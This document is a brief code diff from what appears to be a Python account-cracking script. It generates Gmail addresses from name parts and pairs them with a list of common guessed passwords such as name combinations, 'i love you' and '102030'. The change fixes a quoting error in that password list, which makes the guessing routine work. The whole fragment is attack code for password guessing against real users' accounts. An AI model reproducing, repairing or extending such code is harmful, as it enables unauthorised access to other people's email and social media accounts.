@@ -268,7 +268,7 @@ def sudair_email():
         sudair_Hasan('\033[1;97m====================================================')
         for love in user:
             sudairuser=fastname+code+lasttname+love
-            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire','102030','203040','304050','405060','fastname+'123','lasttname+'123']
+            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire',fastname+'123',lasttname+'123','102030','203040','304050','405060']
             uid = sudairuser+'@gmail.com'
             for Eman in HamiiID:
                 pwx.append(Eman)
